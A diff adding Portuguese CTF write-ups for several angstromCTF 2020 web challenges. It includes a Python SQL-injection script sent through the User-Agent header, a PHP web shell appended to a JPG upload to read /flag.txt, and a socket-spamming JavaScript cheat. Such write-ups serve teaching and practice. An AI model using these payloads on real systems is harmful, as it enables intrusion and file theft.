@@ -115,6 +115,153 @@ run()
 ```
 FLAG >> actf{bopp1ty_bop_bOp_b0p}
 # Consolation - Web
+Esta é bem facil, cliando no unico botão que tem na tela, ele incrementa o valor e limpa o console.
+
+![](assets/payme.png)
+
+é so baixar `iftenmillionfireflies.js` e modificar a palavra `clear` que na verdade é a função que limpa o console por qualquer coisa
+
+```bash
+cat iftenmillionfireflies.js | sed 's/clear/hacker/' > new.txt
+```
+depois copie e cole o script do arquivo `new.txt` e cole no console
+
+![](assets/hacked.png)
+
+FLAG >> actf{you_would_n0t_beli3ve_your_eyes}
 # Secret Agents - Web 
+Olhando o codigo fonte da para identificar um sql injection, tem mais algumas coisa logo abaixo, se o resultado da consulta tiver mais de uma linha ou não tiver nenhum resultado recebemos um erro.
+temos que percorrer linha por linha ate achar a flag.
+```python
+for r in cursor.execute("SELECT * FROM Agents WHERE UA='%s'"%(u), multi=True):
+		if r.with_rows:
+			res = r.fetchall()
+			break
+
+	cursor.close()
+	conn.close()
+
+	
+
+	if len(res) == 0:
+		return render_template("login.html", msg="stop! you're not allowed in here >:)")
+
+	if len(res) > 1:
+		return render_template("login.html", msg="hey! close, but no bananananananananana!!!! (there are many secret agents of course)")
+    
+    return render_template("login.html", msg="Welcome, %s"%(res[0][0]))
+```
+
+> payload
+
+```python
+import requests
+import re
+regex = r"actf{(.*)}"
+
+sql_injection = "' or '1'='1' limit 2,1 #--"
+
+headers = {
+    'authority': 'agents.2020.chall.actf.co',
+    'upgrade-insecure-requests': '1',
+    'user-agent': sql_injection,
+    'sec-fetch-dest': 'document',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-user': '?1',
+    'referer': 'https://agents.2020.chall.actf.co/',
+    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+}
+
+response = requests.get('https://agents.2020.chall.actf.co/login', headers=headers)
+flag = re.findall(regex, bytes(response.content).decode(), re.MULTILINE)
+
+print("actf{"+str("".join(flag))+"}")
+```
+FLAG >> actf{nyoom_1_4m_sp33d}
 # Defund's Crypt - Web
+Este bloco de codigo é bem interessante, posi ele faz o filtro somente do mime type do arquivo, e so é permitido três tipos.
+Obs: a flag esta no arquivo /flag.txt
+```php
+$finfo = new finfo(FILEINFO_MIME_TYPE);
+if (false === $ext = array_search(
+    $finfo->file($_FILES['imgfile']['tmp_name']),
+    array(
+        '.jpg' => 'image/jpeg',
+        '.png' => 'image/png',
+        '.bmp' => 'image/bmp',
+    ),
+    true
+)) {
+    throw new RuntimeException("Your memory isn't picturesque enough to be remembered.");
+}
+```
+teoricamnte se eu pegar qualquer imagem que estaja na lista e moficar colocando `imagem.jpg.php` teria que fazer o upload normalmente.
+
+```bash
+cp crypt.jpg crypt.jpg.php
+echo '<?php echo file_get_contents("/flag.txt"); ?>' >> crypt.jpg.php
+```
+No final do arquivo.
+![](assets/phpdesafio.png)
+
+FLAG >> actf{th3_ch4ll3ng3_h4s_f4ll3n_but_th3_crypt_rem4ins}
+
 # Woooosh - Web
+Este desafio eu não consegui resolver a tempo, mas ele era bem interesante.
+
+no codigo fonte tem duas coisa intersante a primira é que, quando tem um clique na tela, é enviado para o servidor uma requisição, com a posição x e y da tela
+`shapes[0].x e shapes[1].y` a cada acerto o `score` é incrementado;
+
+
+```javascript
+client.on("click", function(x, y) {
+        try {
+            if (!game) {
+                return;
+            }
+            if (typeof x != "number" || typeof y != "number") {
+                return;
+            }
+            if (dist(game.shapes[0].x, game.shapes[1].y, x, y) < 10) {
+                game.score++;
+            }
+            game.shapes = genShapes();
+            client.emit("shapes", game.shapes);
+            client.emit("score", game.score);
+        } catch (err) {
+            console.log("err", err);
+        }
+    })
+```
+No final do jogo se o `score > 20` a flag é enviada
+```javascript
+function endGame() {
+        try {
+            if (game) {
+                if (game.score > 20) {
+                    client.emit(
+                        "disp",
+                        `Good job! You're so good at this! The flag is ${process.env.FLAG}!`
+                    );
+                } else {
+                    client.emit(
+                        "disp",
+                        "Wow you're terrible at this! No flag for you!"
+                    );
+                }
+                game = null;
+            }
+        } catch (err) {
+            console.log("err", err);
+        }
+}
+```
+
+
+```javascript
+setInterval(function(){  window.socket.emit("click",shapes[0].x,shapes[1].y)   }, 10)
+```
+
+FLAG >>  actf{w0000sh_1s_th3_s0und_0f_th3_r3qu3st_fly1ng_p4st_th3_fr0nt3nd}
